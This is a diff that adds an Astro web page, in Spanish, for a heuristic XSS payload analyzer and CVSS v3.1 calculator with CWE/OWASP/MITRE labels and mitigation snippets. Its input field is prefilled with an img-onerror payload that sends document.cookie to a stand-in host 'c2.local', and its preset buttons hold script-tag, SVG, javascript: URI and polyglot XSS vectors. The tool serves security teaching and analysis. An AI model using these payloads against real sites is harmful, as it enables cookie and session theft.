@@ -1,0 +1,211 @@
+---
+import Layout from '../../layouts/Layout.astro';
+---
+
+<Layout title="Analizador Heurístico & CVSS | Simulador de Vulnerabilidades">
+  <div class="space-y-8">
+    
+    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-cyber-border/80 pb-5">
+      <div>
+        <h1 class="text-2xl sm:text-3xl font-bold font-mono text-white flex items-center gap-3">
+          <span class="p-2 rounded-lg bg-cyber-warning/10 border border-cyber-warning/30 text-cyber-warning">
+            <svg class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
+          </span>
+          Analizador de Vectores & Calculadora CVSS v3.1
+        </h1>
+        <p class="text-xs sm:text-sm text-slate-400 mt-1 font-mono">
+          Evaluación estática de patrones de ataque, clasificación de riesgo según OWASP/CWE y cálculo de métricas de severidad.
+        </p>
+      </div>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+      
+      <div class="lg:col-span-5 space-y-4">
+        
+        <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 space-y-4">
+          <div class="flex items-center justify-between">
+            <span class="text-xs font-mono font-bold text-white uppercase">Entrada de Payload a Analizar</span>
+            <span class="text-[10px] font-mono text-slate-400">Inspección Heurística</span>
+          </div>
+
+          <div>
+            <textarea
+              id="analyzer-input"
+              rows="5"
+              class="w-full p-3 rounded-lg bg-cyber-bg border border-cyber-border font-mono text-xs text-cyber-accent focus:border-cyber-accent focus:outline-none resize-none leading-relaxed"
+              placeholder="Pega aquí el vector XSS..."
+            >&lt;img src="x" onerror="fetch('http://c2.local/steal?c=' + document.cookie)"&gt;</textarea>
+          </div>
+
+          <div class="flex flex-wrap gap-1.5">
+            <button class="analyzer-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="<script>alert(1)</script>">Tag Script</button>
+            <button class="analyzer-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="<svg/onload=alert(1)>">SVG Tag</button>
+            <button class="analyzer-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="javascript:alert(document.cookie)">URI Scheme</button>
+            <button class="analyzer-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/<titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e">Polyglot</button>
+          </div>
+        </div>
+
+        <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 space-y-4">
+          <div class="flex items-center justify-between">
+            <span class="text-xs font-mono font-bold text-white uppercase">Taxonomía del Estándar</span>
+          </div>
+
+          <div class="space-y-3 font-mono text-xs">
+            <div class="p-3 rounded bg-cyber-bg border border-cyber-border/60">
+              <div class="text-[10px] text-slate-500 uppercase">Clasificación CWE:</div>
+              <div class="text-cyber-accent font-semibold mt-0.5">CWE-79: Cross-site Scripting</div>
+            </div>
+            <div class="p-3 rounded bg-cyber-bg border border-cyber-border/60">
+              <div class="text-[10px] text-slate-500 uppercase">OWASP Top 10 (2021):</div>
+              <div class="text-cyber-glow font-semibold mt-0.5">A03:2021 – Injection</div>
+            </div>
+            <div class="p-3 rounded bg-cyber-bg border border-cyber-border/60">
+              <div class="text-[10px] text-slate-500 uppercase">MITRE ATT&CK Matrix:</div>
+              <div class="text-purple-400 font-semibold mt-0.5">T1059.007 – JavaScript Execution</div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      <div class="lg:col-span-7 space-y-4">
+        
+        <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 space-y-4">
+          <div class="flex items-center justify-between">
+            <span class="text-xs font-mono font-bold text-white uppercase">Puntuación de Riesgo CVSS v3.1</span>
+            <div id="analyzer-severity-badge"></div>
+          </div>
+
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+            <div class="p-4 rounded-lg bg-cyber-bg border border-cyber-border/80 flex items-center gap-4">
+              <div class="text-4xl font-mono font-bold text-cyber-warning" id="analyzer-cvss-score">8.8</div>
+              <div>
+                <div class="text-[11px] font-mono text-slate-400 uppercase">Puntuación Base</div>
+                <div class="text-xs font-mono text-slate-200 font-bold" id="analyzer-severity-text">ALTO (High)</div>
+              </div>
+            </div>
+
+            <div class="p-4 rounded-lg bg-cyber-bg border border-cyber-border/80 space-y-1">
+              <div class="text-[10px] font-mono text-slate-500 uppercase">Vector String CVSS:</div>
+              <div class="text-xs font-mono text-slate-300 break-all font-semibold" id="analyzer-vector-string">
+                CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
+              </div>
+            </div>
+          </div>
+
+          <div class="space-y-2">
+            <div class="text-xs font-mono text-slate-400">Vectores Identificados:</div>
+            <div id="analyzer-vectors-list" class="flex flex-wrap gap-2"></div>
+          </div>
+
+          <div class="space-y-2">
+            <div class="text-xs font-mono text-slate-400">Detalles Técnicos:</div>
+            <div id="analyzer-details-list" class="space-y-1 text-xs text-slate-300 font-mono"></div>
+          </div>
+        </div>
+
+        <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 space-y-3">
+          <div class="flex items-center justify-between">
+            <h3 class="text-xs font-mono font-bold text-cyber-accent uppercase">Guía de Mitigación & Código Recomendado</h3>
+            <span class="text-[10px] font-mono text-slate-400">Defensa en Profundidad</span>
+          </div>
+
+          <p id="analyzer-remediation-text" class="text-xs text-slate-300 leading-relaxed font-sans"></p>
+
+          <div class="p-3 rounded bg-cyber-bg border border-cyber-border/80 font-mono text-[11px] text-slate-300 overflow-x-auto">
+            <div class="text-slate-500 mb-1">Python / Django Backend:</div>
+            <pre>from django.utils.html import escape, format_html
+safe_output = escape(user_input)</pre>
+            <div class="text-slate-500 mt-2 mb-1">JavaScript DOM:</div>
+            <pre>element.textContent = user_input;</pre>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+
+  </div>
+</Layout>
+
+<script>
+  import { analyzePayload } from '../../utils/xssAnalyzer.js';
+  import { saveLog } from '../../utils/storage.js';
+
+  function runAnalysis() {
+    const input = document.getElementById('analyzer-input');
+    const scoreElem = document.getElementById('analyzer-cvss-score');
+    const sevTextElem = document.getElementById('analyzer-severity-text');
+    const vectorStringElem = document.getElementById('analyzer-vector-string');
+    const vectorsListElem = document.getElementById('analyzer-vectors-list');
+    const detailsListElem = document.getElementById('analyzer-details-list');
+    const badgeContainer = document.getElementById('analyzer-severity-badge');
+    const remTextElem = document.getElementById('analyzer-remediation-text');
+
+    if (!input || !scoreElem) return;
+
+    const payload = input.value;
+    const result = analyzePayload(payload);
+
+    scoreElem.textContent = result.cvssScore.toFixed(1);
+    sevTextElem.textContent = result.severity.toUpperCase();
+    vectorStringElem.textContent = result.cvssVector;
+
+    if (result.severity === 'High' || result.severity === 'Critical') {
+      scoreElem.className = 'text-4xl font-mono font-bold text-cyber-danger';
+    } else if (result.severity === 'Medium') {
+      scoreElem.className = 'text-4xl font-mono font-bold text-cyber-warning';
+    } else {
+      scoreElem.className = 'text-4xl font-mono font-bold text-cyber-glow';
+    }
+
+    if (badgeContainer) {
+      badgeContainer.innerHTML = `
+        <span class="px-2.5 py-0.5 rounded text-xs font-mono font-bold ${
+          result.severity === 'High' || result.severity === 'Critical' ? 'bg-red-950 text-red-400 border border-red-500' :
+          result.severity === 'Medium' ? 'bg-amber-950 text-amber-300 border border-amber-500' :
+          'bg-blue-950 text-blue-300 border border-blue-500'
+        }">${result.severity}</span>
+      `;
+    }
+
+    if (vectorsListElem) {
+      vectorsListElem.innerHTML = result.vectors.map(v => `
+        <span class="px-2 py-0.5 rounded bg-cyber-panel border border-cyber-border text-slate-200 font-mono text-[11px]">${v}</span>
+      `).join('');
+    }
+
+    if (detailsListElem) {
+      detailsListElem.innerHTML = result.details.map(d => `
+        <div class="flex items-start gap-2">
+          <span class="text-cyber-accent">•</span>
+          <span>${d}</span>
+        </div>
+      `).join('');
+    }
+
+    if (remTextElem) {
+      remTextElem.textContent = result.remediation;
+    }
+  }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    const input = document.getElementById('analyzer-input');
+    if (input) {
+      input.addEventListener('input', runAnalysis);
+    }
+
+    document.querySelectorAll('.analyzer-preset').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const code = btn.getAttribute('data-code');
+        if (input && code) {
+          input.value = code;
+          runAnalysis();
+        }
+      });
+    });
+
+    runAnalysis();
+  });
+</script>
